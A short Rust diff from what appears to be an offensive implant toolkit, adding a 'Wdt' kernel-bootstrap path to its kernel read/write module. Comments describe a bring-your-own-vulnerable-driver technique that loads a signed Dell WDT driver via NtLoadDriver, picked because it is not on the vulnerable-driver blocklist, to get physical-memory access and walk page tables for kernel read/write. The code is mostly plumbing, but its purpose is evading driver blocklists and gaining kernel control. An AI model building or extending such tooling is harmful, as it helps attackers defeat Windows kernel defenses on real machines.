@@ -37,6 +37,7 @@ pub mod pagewalk;
 pub mod pattern_scan;
 pub mod resolve;
 pub mod va_rw;
+pub mod wdt;
 /// Real T4-T5 kernel assessment (module enumeration + code integrity +
 /// callback arrays + ETW-TI probe) over a live `KernelRw` — the
 /// operator-side replacement for the implant's user-mode T-REX kernel stubs.
@@ -59,6 +60,11 @@ pub enum KernelBootstrap {
     /// BYOVD fallback — a vulnerable driver loaded via NtLoadDriver.
     /// The `LoadedDriver` must be `unload()`ed by the caller on cleanup.
     Byovd(driver_load::LoadedDriver, ByovdDriver),
+    /// WDTKernel phys mode — blocklist-safe BYOVD (Dell WDT, WHQL-signed,
+    /// not on the vulnerable-driver blocklist). Physical-only primitive
+    /// wrapped by a CR3-discovered VA→PA walk ([`wdt::bootstrap_wdt`]).
+    /// The `LoadedDriver` must be `unload()`ed by the caller on cleanup.
+    Wdt(driver_load::LoadedDriver, va_rw::VaKernelRw<wdt::WdtPhys>),
 }
 
 impl KernelBootstrap {
@@ -67,6 +73,7 @@ impl KernelBootstrap {
         match self {
             KernelBootstrap::KslD(d) => d,
             KernelBootstrap::Byovd(_, d) => d,
+            KernelBootstrap::Wdt(_, rw) => rw,
         }
     }
 }
@@ -610,6 +617,13 @@ pub fn assemble_tier(
             // KernelTier::unload_driver(); move the ByovdDriver (which IS the
             // KernelRw) into the tier.
             (Box::new(driver), Some(Box::new(loaded)))
+        }
+        KernelBootstrap::Wdt(loaded, rw) => {
+            // WDTKernel is a phys-only BYOVD primitive; `VaKernelRw<WdtPhys>`
+            // page-walks the discovered System CR3 to expose the standard
+            // `KernelRw` VA contract. The loaded driver is retained for
+            // explicit cleanup.
+            (Box::new(rw), Some(Box::new(loaded)))
         }
     };
 
